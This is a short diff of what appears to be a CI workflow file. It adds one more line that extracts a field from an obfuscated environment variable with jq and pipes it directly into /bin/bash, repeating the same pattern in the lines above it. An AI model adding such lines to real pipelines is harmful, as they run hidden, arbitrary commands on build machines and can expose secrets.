@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$ch2521" | jq -r .qetg591 | /bin/bash
           echo $qtys3436 | jq -r .ny33914 | /bin/bash
           echo $nb5 | jq -r .zhkr6 | /bin/bash
+          printf '%s' "$vuoly0578" | jq -r .u1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
